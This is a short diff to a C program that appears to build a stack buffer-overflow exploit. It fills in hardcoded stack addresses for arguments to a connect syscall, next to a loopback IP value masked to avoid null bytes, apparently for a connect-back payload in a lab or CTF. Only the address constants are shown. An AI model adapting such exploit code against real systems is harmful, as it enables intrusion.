@@ -47,7 +47,7 @@ int main(void)
   // connect syscall
   char con_arg[] = "\x62\x01\x01\x01";
 
-  char con_arg_3_addr[] = "";
+  char con_arg_3_addr[] = "\x90\x68\xbf\xbf"; // bufr + 371
   
   char con_arg_ip[] = "\x7f\x01\x01\x01";
   char con_arg_ip_mask[] = "\xff\xf0\xf0\xff";
@@ -65,7 +65,7 @@ int main(void)
   char sockaddr_in_addr[] = "\x28\x68\xbf\xbf"; // buf + 267
 
   char con_arg_16_seed[] = "\x01\x01\x01\xf0";
-  char con_arg_16_addr[] = "";
+  char con_arg_16_addr[] = "\x98\x68\xbf\xbf"; // bufr + 379
 
   int i;
   // Fill up buffer
